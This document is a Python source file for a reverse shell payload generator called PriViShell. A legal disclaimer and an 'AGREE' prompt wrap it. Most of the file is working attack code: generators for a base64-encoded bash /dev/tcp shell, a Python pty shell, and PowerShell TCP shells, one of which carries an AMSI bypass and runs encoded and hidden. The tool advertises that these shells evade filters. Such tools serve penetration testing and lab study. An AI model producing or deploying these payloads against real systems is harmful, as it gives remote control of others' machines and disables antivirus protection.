#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║       PriViShell v1.0                                            ║
║       Reverse Shell Payload Generator                            ║
║       Developed by Prince Ubebe | PriViSecurity                  ║
╚══════════════════════════════════════════════════════════════════╝

LEGAL NOTICE:
  This tool generates reverse shell payloads for use in authorized
  penetration testing, CTF competitions, and controlled lab
  environments ONLY. Use against systems you do not own or have
  explicit written permission to test is illegal under the Computer
  Misuse Act, CFAA, and equivalent laws worldwide.
  PriViSecurity accepts no liability for unauthorized use.
"""

import sys, subprocess, importlib

def _auto_install():
    """Auto-install missing dependencies. Works on live Kali, VM, and fresh installs."""
    packages = {
        "rich": "rich",
    }
    missing = []
    for import_name, pip_name in packages.items():
        try:
            importlib.import_module(import_name)
        except ImportError:
            missing.append(pip_name)
    if missing:
        print(f"[PriViSecurity] Installing missing packages: {', '.join(missing)}")
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q",
            *missing
        ])
        print("[PriViSecurity] Done. Launching tool...\n")

_auto_install()


import base64
import re
import sys
import os
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.prompt import Prompt, IntPrompt
from rich.syntax import Syntax

console = Console()

AUTHOR  = "Prince Ubebe"
BRAND   = "PriViSecurity"
VERSION = "3.0"
TOOL    = "PriViShell"


# ── AUTHORIZATION GATE ────────────────────────────────────────────────────────

def authorization_gate():
    os.system("clear")

    gate_text = Text()
    gate_text.append("\n  ⚠️  LEGAL AUTHORIZATION REQUIRED\n\n", style="bold red")
    gate_text.append(
        "  This tool generates reverse shell payloads for use in:\n\n",
        style="white"
    )
    gate_text.append("    ✔  Systems you own, OR\n", style="green")
    gate_text.append("    ✔  Authorized penetration testing engagements\n", style="green")
    gate_text.append("       with a signed Letter of Authorization (LoA), OR\n", style="green")
    gate_text.append("    ✔  CTF competitions and isolated lab environments.\n\n", style="green")
    gate_text.append(
        "  Generating and deploying payloads against systems without\n"
        "  explicit written authorization is a criminal offence.\n\n",
        style="dim white"
    )
    gate_text.append(
        "  PriViSecurity accepts NO liability for unauthorized use.\n\n",
        style="dim red"
    )

    console.print(Panel(
        gate_text,
        border_style="red",
        title=f"[bold red]{TOOL} v{VERSION} — {BRAND}[/bold red]"
    ))

    console.print("[bold white]Do you confirm you are authorized to use this tool for your intended target?[/bold white]")
    console.print("[dim]Type [bold green]AGREE[/bold green] to confirm and proceed, or press Ctrl+C to exit.[/dim]\n")

    try:
        response = input("  > ").strip()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Session cancelled.[/bold yellow]")
        sys.exit(0)

    if response != "AGREE":
        console.print("\n[bold red][!] Authorization not confirmed. Exiting.[/bold red]")
        sys.exit(0)

    console.print("\n[bold green][✔] Authorization confirmed. Proceeding.[/bold green]\n")


# ── HEADER ────────────────────────────────────────────────────────────────────

def print_header():
    os.system("clear")
    header = Text()
    header.append(
        "\n"
        "  ██████╗ ██████╗ ██╗██╗   ██╗██╗███████╗██╗  ██╗███████╗██╗     ██╗\n"
        "  ██╔══██╗██╔══██╗██║██║   ██║██║██╔════╝██║  ██║██╔════╝██║     ██║\n"
        "  ██████╔╝██████╔╝██║██║   ██║██║███████╗███████║█████╗  ██║     ██║\n"
        "  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██║╚════██║██╔══██║██╔══╝  ██║     ██║\n"
        "  ██║     ██║  ██║██║ ╚████╔╝ ██║███████║██║  ██║███████╗███████╗███████╗\n"
        "  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\n",
        style="bold cyan"
    )
    header.append(
        f"  {BRAND}  |  {TOOL} v{VERSION}  |  Reverse Shell Payload Generator\n",
        style="dim white"
    )
    header.append(f"  Developer: {AUTHOR}  |  Authorized Use Only\n", style="dim red")
    console.print(Panel(header, border_style="blue"))


# ── PAYLOAD GENERATORS ────────────────────────────────────────────────────────

def generate_bash(ip: str, port: str) -> str:
    raw = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    b64 = base64.b64encode(raw.encode()).decode()
    return f"echo {b64} | base64 -d | bash"


def generate_python(ip: str, port: str) -> str:
    return (
        f"python3 -c \""
        f"import socket,os,pty;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect(('{ip}',{int(port)}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\""
    )


def generate_powershell_standard(ip: str, port: int) -> str:
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1 | Out-String);"
        f"$t=$r+'PS '+(pwd).Path+'> ';"
        f"$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    return f'powershell -NoP -NonI -c "{ps}"'


def generate_powershell_amsi(ip: str, port: int) -> str:
    """
    PowerShell payload with AMSI bypass via amsiInitFailed reflection.
    This technique is publicly documented in red team literature and
    used in authorized lab/CTF environments to test AMSI defences.
    """
    bypass = (
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    )
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1 | Out-String);"
        f"$t=$r+'PS '+(pwd).Path+'> ';"
        f"$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    combined = f"{bypass}; {ps}"
    encoded  = base64.b64encode(combined.encode("utf-16-le")).decode()
    return f"powershell -NoP -NonI -W Hidden -Enc {encoded}"


# ── VALIDATION ────────────────────────────────────────────────────────────────

def validate_ip(ip: str) -> bool:
    ipv4     = re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip)
    hostname = re.match(r"^[a-zA-Z0-9._-]+$", ip)
    if not (ipv4 or hostname):
        return False
    if ipv4:
        parts = ip.split(".")
        if any(int(p) > 255 for p in parts):
            return False
    return True


# ── SAVE TO FILE ──────────────────────────────────────────────────────────────

def save_payload(content: str, extension: str, lport: str):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"PriViShell_Payload_{timestamp}.{extension}"
    try:
        with open(filename, "w") as f:
            f.write(content)
        console.print(f"\n[bold green][+] Payload saved:[/bold green] [cyan]{filename}[/cyan]")
        console.print(f"[bold magenta][*] Start your listener:[/bold magenta] [white]nc -lvnp {lport}[/white]")
    except Exception as e:
        console.print(f"[bold red][!] Error writing file: {e}[/bold red]")


# ── PAYLOAD MENU ──────────────────────────────────────────────────────────────

def show_payload_menu():
    table = Table(
        title="Available Payloads",
        border_style="blue",
        show_lines=True,
        title_style="bold cyan"
    )
    table.add_column("No.", style="bold cyan", width=5)
    table.add_column("Type",    style="bold white", width=20)
    table.add_column("Platform", style="white", width=12)
    table.add_column("Description", style="dim white")

    table.add_row("1", "Bash (Base64 Encoded)",       "Linux",   "Encoded bash reverse shell — evades basic string filters")
    table.add_row("2", "Python3 PTY Spawn",            "Linux",   "Full interactive PTY via Python socket + pty.spawn")
    table.add_row("3", "PowerShell Standard",          "Windows", "Standard PS TCP reverse shell")
    table.add_row("4", "PowerShell + AMSI Bypass",     "Windows", "PS shell with amsiInitFailed reflection bypass — lab/CTF use")

    console.print(table)


# ── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    authorization_gate()
    print_header()

    # Get LHOST and LPORT
    console.print("[bold white]Listener Configuration[/bold white]\n")

    lhost = Prompt.ask("[cyan]LHOST (your listener IP)[/cyan]").strip()
    if not lhost or not validate_ip(lhost):
        console.print("[bold red][!] Invalid LHOST. Must be a valid IP or hostname.[/bold red]")
        sys.exit(1)

    lport_raw = Prompt.ask("[cyan]LPORT (your listener port)[/cyan]", default="4444").strip()
    try:
        lport_int = int(lport_raw)
        if not (1 <= lport_int <= 65535):
            raise ValueError
    except ValueError:
        console.print("[bold red][!] Invalid port. Must be 1–65535.[/bold red]")
        sys.exit(1)

    console.print()
    show_payload_menu()
    console.print()

    choice = Prompt.ask("[cyan]Select payload[/cyan]", choices=["1","2","3","4"])

    payload, ext, label = "", "", ""

    if choice == "1":
        payload = generate_bash(lhost, lport_raw)
        ext, label = "sh", "Bash (Base64 Encoded)"
    elif choice == "2":
        payload = generate_python(lhost, lport_raw)
        ext, label = "py", "Python3 PTY Spawn"
    elif choice == "3":
        payload = generate_powershell_standard(lhost, lport_int)
        ext, label = "ps1", "PowerShell Standard"
    elif choice == "4":
        payload = generate_powershell_amsi(lhost, lport_int)
        ext, label = "ps1", "PowerShell + AMSI Bypass"
        console.print(
            "\n[bold yellow][~] AMSI Bypass Note:[/bold yellow] [dim white]"
            "amsiInitFailed reflection — documented red team technique. "
            "For authorized lab/CTF use only.[/dim white]"
        )

    console.print(f"\n[bold green][+] Generated:[/bold green] [cyan]{label}[/cyan]")
    console.print(f"[bold magenta][*] Listener command:[/bold magenta] [white]nc -lvnp {lport_raw}[/white]\n")

    # Output options
    out_table = Table(show_header=False, box=None, padding=(0, 2))
    out_table.add_column(style="bold cyan", width=4)
    out_table.add_column(style="white")
    out_table.add_row("1.", "Display payload on screen")
    out_table.add_row("2.", f"Save to file  (PriViShell_Payload_<timestamp>.{ext})")
    out_table.add_row("3.", "Both — display and save")
    console.print(out_table)
    console.print()

    out_choice = Prompt.ask("[cyan]Output[/cyan]", choices=["1","2","3"])

    if out_choice in ("1", "3"):
        lang = "bash" if ext in ("sh", "py") else "powershell"
        syntax = Syntax(payload, lang, theme="monokai", word_wrap=True)
        console.print(Panel(syntax, title=f"[bold green]{label} Payload[/bold green]", border_style="green"))

    if out_choice in ("2", "3"):
        save_payload(payload, ext, lport_raw)

    console.print("\n[bold green][✔] Done. PriViSecurity standing by.[/bold green]\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Exit requested.[/bold yellow]")
        sys.exit(0)
